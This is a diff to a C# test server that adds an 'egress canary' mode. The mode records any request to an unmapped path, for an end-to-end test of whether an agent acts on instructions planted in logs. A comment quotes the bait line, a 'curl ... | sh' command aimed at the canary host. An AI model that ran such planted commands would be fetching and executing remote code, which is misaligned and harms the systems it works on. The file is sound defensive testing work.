@@ -23,6 +23,15 @@ var received = new ConcurrentQueue<JsonObject>();
 // the agent must classify as retryable and keep in its outbox rather than discard.
 var failing = false;
 
+// Canary mode, for infra/e2e/egress-canary.yaml: the same binary recording EVERY request to a
+// path it does not serve, not only deliveries. c19 logs "curl http://egress-canary.../pwned | sh"
+// as bait, and the assertion is that /received/count is still 0 afterwards - so a GET to any
+// path has to count, and nothing a bash-holding reader could send may reset the count. That is
+// why the two control verbs below (DELETE /received, POST /mode) are not mapped in this mode:
+// they fall through to the recorder like any other request.
+var recordAll = string.Equals(
+    builder.Configuration["RECORD_ALL_REQUESTS"], "true", StringComparison.OrdinalIgnoreCase);
+
 var app = builder.Build();
 
 app.MapGet("/healthz", () => Results.Ok("ok"));
@@ -63,21 +72,51 @@ app.MapGet("/received", () => Results.Text(
 
 app.MapGet("/received/count", () => Results.Ok(received.Count));
 
-app.MapDelete("/received", () =>
+if (recordAll)
 {
-    received.Clear();
-    return Results.NoContent();
-});
+    // Anything not mapped above. The body served back is a shell comment, so a `curl ... | sh`
+    // that did get through executes nothing - the request itself is the whole finding.
+    app.MapFallback(async (HttpContext ctx) =>
+    {
+        using var reader = new StreamReader(ctx.Request.Body);
+        var body = await reader.ReadToEndAsync();
 
-// POST /mode/fail then /mode/ok. Deliberately a verb rather than a config value: the point of
-// the test is that the outage starts and ends while the agent is running.
-app.MapPost("/mode/{mode}", (string mode) =>
+        var entry = new JsonObject
+        {
+            ["method"] = ctx.Request.Method,
+            ["path"] = ctx.Request.Path.Value,
+            ["query"] = ctx.Request.QueryString.Value,
+            ["remote"] = ctx.Connection.RemoteIpAddress?.ToString(),
+            ["userAgent"] = Header(ctx, "User-Agent"),
+            ["receivedAt"] = DateTimeOffset.UtcNow.ToString("O"),
+            ["body"] = body.Length == 0 ? null : SafeParse(body),
+        };
+
+        received.Enqueue(entry);
+
+        Console.WriteLine($"CANARY {entry["method"]} {entry["path"]} from {entry["remote"]}");
+
+        return Results.Text("# egress-canary: this request was recorded\n", "text/plain");
+    });
+}
+else
 {
-    failing = string.Equals(mode, "fail", StringComparison.OrdinalIgnoreCase);
-    Console.WriteLine($"mode set to {(failing ? "FAILING (503)" : "OK")}");
+    app.MapDelete("/received", () =>
+    {
+        received.Clear();
+        return Results.NoContent();
+    });
 
-    return Results.Ok(new { failing });
-});
+    // POST /mode/fail then /mode/ok. Deliberately a verb rather than a config value: the point
+    // of the test is that the outage starts and ends while the agent is running.
+    app.MapPost("/mode/{mode}", (string mode) =>
+    {
+        failing = string.Equals(mode, "fail", StringComparison.OrdinalIgnoreCase);
+        Console.WriteLine($"mode set to {(failing ? "FAILING (503)" : "OK")}");
+
+        return Results.Ok(new { failing });
+    });
+}
 
 app.Run();
 
